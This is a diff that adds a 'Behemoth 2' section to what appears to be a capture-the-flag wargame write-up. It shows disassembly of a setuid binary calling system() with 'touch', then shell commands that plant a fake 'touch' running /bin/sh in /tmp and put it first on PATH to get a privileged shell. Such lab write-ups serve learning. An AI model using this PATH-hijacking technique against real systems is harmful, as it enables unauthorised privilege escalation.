@@ -49,3 +49,24 @@ int main(int argc, char *argv[]) {
 - https://stackoverflow.com/questions/55941924/why-was-nop-assigned-to-0x90-in-x86-assembly
 
 
+
+## Behemoth 2
+
+```
+...snip...
+   0x080485f3 <+136>:   push   eax
+   0x080485f4 <+137>:   call   0x8048410 <system@plt>
+...snip...
+```
+
+```
+eax = 0xffffd684:     "touch 29161" ; eax in function main+136
+```
+
+```sh
+mkdir /tmp/mal
+echo "/bin/sh" > /tmp/mal/touch
+chmod +x /tmp/mal/touch
+export PATH=/tmp/mal:$PATH
+/behemoth/behemoth2
+```
